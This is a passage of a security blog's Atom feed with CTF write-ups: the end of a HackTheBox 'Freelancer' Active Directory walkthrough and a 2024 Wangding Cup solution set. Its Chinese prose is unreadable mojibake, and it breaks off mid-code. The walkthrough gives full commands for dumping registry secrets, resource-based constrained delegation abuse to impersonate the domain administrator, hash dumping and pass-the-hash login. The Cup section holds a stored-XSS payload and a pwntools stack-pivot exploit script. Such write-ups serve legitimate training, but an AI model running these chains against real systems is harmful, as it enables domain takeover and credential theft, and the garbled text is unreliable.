src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192808087-2027884009.png" alt="image-20241031192800564"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031193202144-454390878.png" alt="image-20241031193154701"></p><p>Ëß£ÂéãÂêéÂèëÁé∞ÊòØ‰∏™ <code>DMP</code>Êñá‰ª∂</p><p>‰ΩøÁî®<a href="https://github.com/ufrisk/MemProcFS">MemProcFS</a>ËøõË°åÂàÜÊûê</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./memprocfs -device /root/HackTheBox/Freelancer/share/MEMORY.DMP -mount /root/HackTheBox/Freelancer/dmp_mnt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194502165-752955147.png" alt="image-20241031194454182"></p><p>Â∞ÜÂÖ∂ÊåÇËΩΩÂà∞‰∏Ä‰∏™Á©∫ÁõÆÂΩïÔºåÂú®ÂàáÊç¢ÁªàÁ´ØÊü•ÁúãËØ•ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194557174-879320302.png" alt="image-20241031194549629"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194716386-270783784.png" alt="image-20241031194708714"></p><p>ÂèëÁé∞Âú®<code>registry/hive_files</code>ÁõÆÂΩï‰∏ãÊâæÂà∞SAM„ÄÅSYSTEMÂíåSECURITYÊñá‰ª∂</p><p>‰ΩøÁî®<code>secretsdump</code>ÂØºÂá∫hashÂÄº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031194947565-950391359.png" alt="image-20241031194939897"></p><p>ÂèëÁé∞Âú®ÊúÄ‰∏ãÈù¢Êúâ‰∏Ä‰∏≤ÊòéÊñáÂØÜÁ†Å<code>PWN3D#l0rr@Armessa199</code></p><p>ÁªßÁª≠Â∞ùËØïÂØÜÁ†ÅÂñ∑Ê¥í</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031195259082-1047005503.png" alt="image-20241031195251538"></p><p>ÊâæÂà∞‰∏ÄÁªÑÂá≠ÊçÆ<code>lorra199:PWN3D#l0rr@Armessa199</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201223159-1255973466.png" alt="image-20241031201215390"></p><p>winrmÂèëÁé∞‰πüÂèØ‰ª•‰ΩøÁî®ÔºåÁõ¥Êé•‰ΩøÁî®<code>evil-winrm</code>ÁôªÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031201409985-1471373558.png" alt="image-20241031201402294"></p><p>ÊàêÂäüÁôªÂΩï<code>lorra199</code>Áî®Êà∑</p><h1>ÊùÉÈôêÊèêÂçá</h1><h2 id="bloodhound‰ø°ÊÅØÊî∂ÈõÜ">bloodhound‰ø°ÊÅØÊî∂ÈõÜ</h2><p>ÂÖà‰ΩøÁî®<code>bloodhound-python</code>‰ø°ÊÅØÊêúÈõÜ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.11.5 --dns-tcp -d freelancer.htb -u lorra199 -p PWN3D<span class="comment">#l0rr@Armessa199 -c All --zip</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031202047153-583515341.png" alt="image-20241031202039091"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031204334572-282778564.png" alt="image-20241031204327239"></p><p>ÂèëÁé∞<code>lorra199</code>Áî®Êà∑Â±û‰∫é<code>AD RECYCLE BIN</code>ÁªÑ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205200402-623938844.png" alt="image-20241031205153099"></p><p>ÂêåÊó∂ËøòÊ≥®ÊÑèÂà∞<code>AD RECYCLE BIN</code>ÁªÑÂØπ<code>DC</code>Êúâ<code>GenericWrite</code>ÊùÉÈôêÔºåÂèØ‰ª•‰øÆÊîπËØ•Ë¥¶Êà∑ÁöÑÂ±ûÊÄßÔºåÂåÖÊã¨ËÆæÁΩÆÊàñÊõ¥ÊîπÂÖÅËÆ∏ÂßîÊ¥æÂà∞ÁöÑÊúçÂä°ÂàóË°®ÔºåËøôÂèØ‰ª•Èó¥Êé•ÂÆûÁé∞Á∫¶ÊùüÂßîÊ¥æÔºàRBCDÔºâ</p><h2 id="RBCD">RBCD</h2><blockquote><p>Âú®ËÆ°ÁÆóÊú∫ÂØπË±°‰∏äÊª•Áî® <code>GenericWrite</code> ÁöÑ‰∏ÄÁßçÊñπÊ≥ïÊòØÂú®Âüü‰∏äÂàõÂª∫‰∏ÄÂè∞ÂÅáËÆ°ÁÆóÊú∫ÔºåÁÑ∂ÂêéÂÜôÂÖ• DCÔºåËØ•ÂÅáËÆ°ÁÆóÊú∫ËÉΩÂ§ü‰Ωú‰∏∫ DC ËøõË°åÂßîÊ¥æÔºà‰ΩøÁî®Âü∫‰∫éËµÑÊ∫êÁöÑÁ∫¶ÊùüÂßîÊ¥æ ÔºàRBCDÔºâÔºâ„ÄÇÁÑ∂ÂêéÔºåÊàëÂèØ‰ª•‰Ωú‰∏∫ DC ËØ∑Ê±ÇÁ•®ËØÅÂπ∂ÂÖÖÂΩì DC„ÄÇ</p></blockquote><ul><li>Ê∑ªÂä†ËÆ°ÁÆóÊú∫</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;Ya$&#x27;</span> -computer-pass <span class="string">&#x27;Aa123456!&#x27;</span> -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:<span class="string">&#x27;PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031205840693-1296189239.png" alt="image-20241031205832864"></p><ul><li>‰ΩøÁî®RBCDÔºåÂ¶ÇÊûúËøôÂè∞ PC Â±û‰∫é‚ÄúÂüüÁÆ°ÁêÜÂëò‚ÄùÁªÑÔºåÊàë‰ª¨Â∞ÜÊéà‰∫àÂÆÉÂÜíÂÖÖ‰∏∫Áî®Êà∑‚ÄúÁÆ°ÁêÜÂëò‚ÄùÁöÑÊùÉÈôê</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbcd.py -delegate-from <span class="string">&#x27;Ya$&#x27;</span> -delegate-to <span class="string">&#x27;DC$&#x27;</span> -dc-ip 10.10.11.5 -action <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031210246405-289400388.png" alt="image-20241031210239085"></p><ul><li>‰ΩøÁî®getSTËé∑ÂèñÊúçÂä°Á•®ËØÅ‰ª•ËÆøÈóÆÊúçÂä°CIFS</li></ul><p>Âú®ËØ∑Ê±ÇÁ•®ÊçÆ‰πãÂâçÔºåÂÖà‰∏éÊúçÂä°Âô®Êó∂Èó¥ÂêåÊ≠•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s freelancer.htb</span><br></pre></td></tr></table></figure><p>ÂÜçËØ∑Ê±ÇÁ•®ÊçÆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&#x27;cifs/dc.freelancer.htb&#x27;</span> -dc-ip 10.10.11.5 -impersonate <span class="string">&#x27;administrator&#x27;</span> <span class="string">&#x27;freelancer.htb/Ya:Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211232406-563143332.png" alt="image-20241031211224615"></p><p>ÂØºÂÖ•Á•®ÊçÆÔºåÁÑ∂Âêé‰ΩøÁî®secretdumpËé∑ÂèñhashÂÄº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&#x27;freelancer.htb/Administrator@DC.freelancer.htb&#x27;</span> -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntl</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211643068-790736658.png" alt="image-20241031211635032"></p><p>ÊúÄÂêé<code>evil-winrm</code>ÁôªÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i freelancer.htb -u administrator -H <span class="string">&#x27;0039318f1e8274633445bce32ad1a290&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211735148-656830288.png" alt="image-20241031211727679"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031211810839-438087994.png" alt="image-20241031211803217"></p><p>Âú®<code>Desktop</code>ÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxÁØá‰πãFreelancer</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    <category term="Active Directory" scheme="https://www.fomal.cc/categories/HackTheBox/Active-Directory/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>ÁΩëÈºéÊùØ ÈùíÈæôÁªÑ 2024</title>
    <link href="https://www.fomal.cc/posts/f29ac13a.html"/>
    <id>https://www.fomal.cc/posts/f29ac13a.html</id>
    <published>2024-10-30T10:03:36.000Z</published>
    <updated>2024-10-30T10:10:14.079Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>WEB</h1><h2 id="WEB02Ôºö">WEB02Ôºö</h2><p>ËÆøÈóÆËØ•ÁéØÂ¢ÉÔºåÁôªÈôÜÊ≥®ÂÜåËÉΩÈöè‰æøÁôªÔºå‰ºöËøîÂõû‰∏Ä‰∏™/content/hash‰Ωú‰∏∫Ë∑ØÁî±ÔºåÁÑ∂ÂêéÊãødirsearchÊâ´‰∏Ä‰∏ãÂè™ËÉΩÂèëÁé∞‰∏Ä‰∏™flagË∑ØÁî±ÔºåÂõûÊòæ‰Ω†ÊòØbossÂòõÔºüÂ∞±ÊÉ≥ÁúãÂÖ∂‰ªñÊó†‰∫∫Êú∫ÊãüÂÆöÊâßË°å‰ªªÂä°Ôºü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180453448-634328005.png" alt="image-20241030180447239"></p><p>ËøõËøô‰∏™Ë∑ØÁî±‰πãÂêéÊúâ3ÊåâÈíÆÔºåÊèê‰∫§ÔºåÂà∑Êñ∞ÔºåÂíåÊõ¥Êñ∞Ôºå‰∏ÄÂºÄÂßã‰∏ÄÁõ¥Âú®ËØïÊãøfenjingÊ¢≠sstiÔºåÁÑ∂Âêé‰∏çÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180459681-135067479.png" alt="image-20241030180453738"></p><p>‰πãÂêéÂ∞ùËØïÂÜôxssÔºåÂèëÁé∞Â≠òÂú®Â≠òÂÇ®ÂûãxssÔºå‰πãÂêéÂ∞ùËØïÊãøhackbarÁöÑxss‰∏ÄÊääÊ¢≠‰∏Ä‰∏ãÔºåÊÉ≥ÂºπÂà∞ceye.io‰∏äÔºåÂíãÂºπÈÉΩÂõûÊòæÈÇ£‰∏™‰∏çÊòØbossÔºåÊàëËøò‰ª•‰∏∫ÊòØpayloadÊúâÈóÆÈ¢òÔºå‰ª•‰∏∫ÊòØË¶ÅÂºπÂà∞ÂΩìÂâçË∑ØÁî±</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180509840-252441728.png" alt="image-20241030180503515"></p><p>‰πãÂêéÁúãÂìçÂ∫îÂåÖÔºåÁ™ÅÁÑ∂ÂèëÁé∞‰ªñÁöÑÊèê‰∫§ÊòØÁÇπÂáªÊèê‰∫§ÂΩìÂâçÈ°µÈù¢Ôºåboss‰ºöÂÆ°Ê†∏‰Ω†ÁöÑËµ∑È£û‰ªªÂä°Ê∏ÖÂçïÔºåÊâÄ‰ª•‰ΩøÁî®submitÊèê‰∫§ÂêéÔºåÂ∞±ÊòØÁõ¥Êé•bossÂÆ°Ê†∏ÁöÑ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180524353-506826609.png" alt="image-20241030180518438"></p><p>ÊâÄ‰ª•ÊúÄÂêéÊòØÈúÄË¶ÅÊàë‰ª¨Êääxss payloadÂ≠òÂÇ®‰πãÂêéÔºåÁÇπÂáªsubmitÔºåÂ∞±ÊòØÁî±bossÊèê‰∫§ÁöÑÔºåÁÑ∂ÂêéÂ∞±ËÉΩÊääflagË∑ØÁî±ÁöÑÂõûÊòæËæìÂá∫Âà∞ÂΩìÂâçÈ°µÈù¢‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180530487-2088539579.png" alt="image-20241030180524536"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/content/2f9f1f36782a270b689d8c0f3e9e08df&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>:<span class="string">&quot;content=123&quot;</span>%2bdata</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1>PWN</h1><h2 id="PWN02">PWN02</h2><p>È¶ñÂÖàÊòØ‰∏Ä‰∏™loginÁöÑÁôªÂΩïÁªïËøáÔºåÁõ¥Êé•ÊåâÁÖßÂÆÉÁöÑË¶ÅÊ±ÇËæìÂ∞±Â•Ω‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180537716-735995572.png" alt="image-20241030180532038"></p><p>ÁÑ∂ÂêéËøáÂà∞‰∏ãÈù¢ÁöÑvulnÂáΩÊï∞‰∏≠ÂéªÊâìÊ∫¢Âá∫ÔºåËøôËæπÁúºÁûÖÁùÄÁöÑÈïøÂ∫¶ËÇØÂÆö‰∏çÂ§üÔºåÈ¶ñÂÖàÊÉ≥Âà∞ÊâìÊ†àËøÅÁßª,ÁªôÂá∫ÂêéÁª≠Âú∞ÂùÄ‰πãÂêéÁõ¥Êé•Êâì</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180542217-1925355468.png" alt="image-20241030180536624"></p><p>ÁÑ∂ÂêéÁúãÂà∞ÊúâÁªôÂá∫ÂÆåÊï¥ÂêéÈó®ÔºåÈÇ£‰πàÂ∞±Â•ΩÊâì‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180549697-1876912266.png" alt="image-20241030180544198"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180554685-1109696381.png" alt="image-20241030180549098"></p><p>Áõ¥Êé•Ê†àËøÅÁßªÊâìsystem</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180600784-1355890361.png" alt="image-20241030180554897"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn&quot;</span>,<span class="number">44958</span>)</span><br><span class="line">sh_address=<span class="number">0x0804A038</span></span><br><span class="line">ret_address=<span class="number">0x08048674</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your username: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your password: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;admin123\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stac = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stac))</span><br><span class="line"></span><br><span class="line">payload = (p32(<span class="number">0x080485E6</span>)+p32(<span class="number">0</span>)+p32(sh_address)).ljust(<span class="number">80</span>,<span class="string">b&quot;\x00&quot;</span>)+p32(stac-<span class="number">4</span>)+p32(ret_address)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;plz input your msg:\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1>REVERSE</h1><h2 id="REVERSE01">REVERSE01</h2><p>ÂÆâÂçìÈ¢òÔºåÊúâÊ∑∑Ê∑ÜÔºåÂÖàÊâæMainActivityÔºåÈîÅÂÆö‰∏ªË¶ÅÈÄªËæëÂ¶Ç‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180611619-2052552002.png" alt="image-20241030180605900"></p><p>‰∏ªË¶ÅÂ∞±ÊòØË∑üÂÖ∂‰∏≠ÁöÑcheckÊñπÊ≥ïÔºåÂèëÁé∞ÊòØnativeÂ±ÇÂä†ÂØÜÈÄªËæë</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180616027-127520718.png" alt="image-20241030180610625"></p><p>ÈÇ£‰πàÁõ¥Êé•Ëß£ÂåÖapkÂéªÁúãÈÄªËæëÔºåÈÄªËæë‰πüÁõ∏ÂØπÊ∏ÖÊô∞Ôºå‰∏ªË¶ÅÂä†ÂØÜÈÄªËæëÊúâÁÇπÁúºÁÜüÔºåËøá‰∏Ä‰∏ãgptÂæóÁü•Á°ÆÂÆûÊòØsm4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180623464-1322363819.png" alt="image-20241030180617201"></p><p>ÈÇ£‰πàÁõ¥Êé•ÊâækeyÂó¶‰∏ÄÊääËØïËØï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180630567-2040125301.png" alt="image-20241030180625061"></p><p>Ê≥®ÊÑèÂêéÈù¢ÁöÑËøô‰∏™Z0099864ÁöÑËµãÂÄºÊúâ‰∏™Á´ØÂ∫èÈóÆÈ¢òÔºåÂÅö‰∏Ä‰∏™ÂÄíÂ∫èÂ∞±Â•Ω</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180638144-1936208116.png" alt="image-20241030180632275"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;Z0099864&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#4689900Z</span></span><br></pre></td></tr></table></figure><p>ÊãºÊé•Ëµ∑Êù•‰πãÂêéÊääÂØÜÊñáÊèêÂèñÂá∫Êù•Áõ¥Êé•Ëß£SM4ÔºåË∑üËøõÂèòÈáèÊèêÂèñÂØÜÊñá</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180642384-967731827.png" alt="image-20241030180636886"></p><p>ÊúÄÁªàËß£Âá∫flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180646848-1493421369.png" alt="image-20241030180641293"></p><h2 id="REVERSE02">REVERSE02</h2><p>ÈÄªËæë‰ªÄ‰πàÁöÑÈÉΩÁõ∏ÂΩìÊ∏ÖÊ•ö‰∫ÜÔºåÁÑ∂ÂêéÁªìÂêàÈ¢òÁõÆÁªôÁöÑ‰ø°ÊÅØÔºåÈ°æÂêçÊÄù‰πâÂõõÊÆµÂä†ÂØÜ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180656646-1243407274.png" alt="image-20241030180651066"></p><p>Á¨¨‰∏ÄÊÆµÊòØ‰πò‰ª•2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180702111-692318069.png" alt="image-20241030180656553"></p><p>Á¨¨‰∫åÊÆµÊòØÂºÇÊàñ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180705623-1786287139.png" alt="image-20241030180700192"></p><p>Á¨¨‰∏âÊÆµÊòØËá™ÂÆö‰πâÁ†ÅË°®ÁöÑ‰∏Ä‰∏™base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180710945-1425284552.png" alt="image-20241030180705465"></p><p>Á¨¨ÂõõÊÆµÊòØËß£‰∏Ä‰∏™AES</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180716007-858819302.png" alt="image-20241030180710249"></p><p><strong>EXPÔºö</strong></p><p>ÂÖ∂‰∏≠Á¨¨‰∏âÊÆµËß£base64ÁöÑÁªìÊûú‰∏∫</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180729798-926729124.png" alt="image-20241030180723965"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s2=[<span class="number">0x70</span>,<span class="number">0xCC</span>,<span class="number">0x62</span>,<span class="number">0xCA</span>,<span class="number">0x60</span>,<span class="number">0x6E</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;part1:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">round</span>(s2[i]/<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># #part1:81fe0766</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x7D</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x52</span>]</span><br><span class="line">xor_key=<span class="string">&quot;XorrLord&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart2:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_key)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]^<span class="built_in">ord</span>(xor_key[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#part2:197e1bc6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#part3:809832f4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;AesMasterAesMast&quot;</span>  </span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v4 = <span class="built_in">bytes</span>([<span class="number">251</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">171</span>, <span class="number">217</span>, <span class="number">136</span>, <span class="number">230</span>, <span class="number">11</span>, <span class="number">147</span>, <span class="number">124</span>, <span class="number">149</span>, <span class="number">235</span>, <span class="number">148</span>, <span class="number">219</span>, <span class="number">11</span>, <span class="number">84</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰ΩøÁî® AES ECB Ê®°ÂºèËß£ÂØÜ v4</span></span><br><span class="line">decrypted_data = cipher.decrypt(v4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\npart4:&quot;</span>, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#par4:d346fe66</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÊãºÊé•Ëµ∑Êù•ÂæóÂà∞ÊúÄÁªàÁöÑflag‰∏∫<code>wdflag&#123;81fe0766197e1bc6809832f4d346fe66&#125;</code></p><h1>CRYPTO</h1><h2 id="CRYPTO02">CRYPTO02</h2><p>Áõ¥Êé•‰∏äÁΩëÊêúÁ¥¢ÔºåÊâæÂà∞ÂéüÈ¢ò</p><p><a href="https://www.cnblogs.com/mumuhhh/p/17789591.html">https://www.cnblogs.com/mumuhhh/p/17789591.html</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180739183-1151293321.png" alt="image-20241030180733303"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030180744278-69578574.png" alt="image-20241030180738691"></p><p>Ê†πÊçÆÁªôÂá∫ÁöÑËÑöÊú¨ËøõË°åËß£ÂØÜ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 